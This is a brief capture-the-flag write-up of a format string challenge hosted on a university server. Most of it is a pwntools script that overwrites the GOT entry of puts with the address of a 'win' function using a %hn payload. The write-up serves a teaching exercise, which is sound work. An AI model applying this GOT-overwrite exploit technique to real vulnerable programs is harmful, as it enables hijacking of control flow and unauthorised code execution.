# Challenge `Calling Functions Again` writeup

- Vulnerability:
  - Format string
- Where: Where is the vulnerability present
  - `mustard.stt.rnl.tecnico.ulisboa.pt` on port 23197
- Impact:
  - Allows attacker to call arbitrary functions

## Steps to reproduce

1. Using `elf` we can obtain the `puts` and `win` address
2. We need to write the address of `win` in `puts`
3. Since we can only write 2 bytes at once, we need to split the address

The code used was the following:

```py
from pwn import *

s = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 23197, timeout=100)

elf = ELF("07_call_functions")
win_function = elf.symbols['win']
puts_got = elf.got['puts']

payload = p32(puts_got) + p32(puts_got + 2) + "%{}x%7$hn".format((win_function & 0xffff) - 8).encode()

s.sendline(payload)
print(s.recvall())
```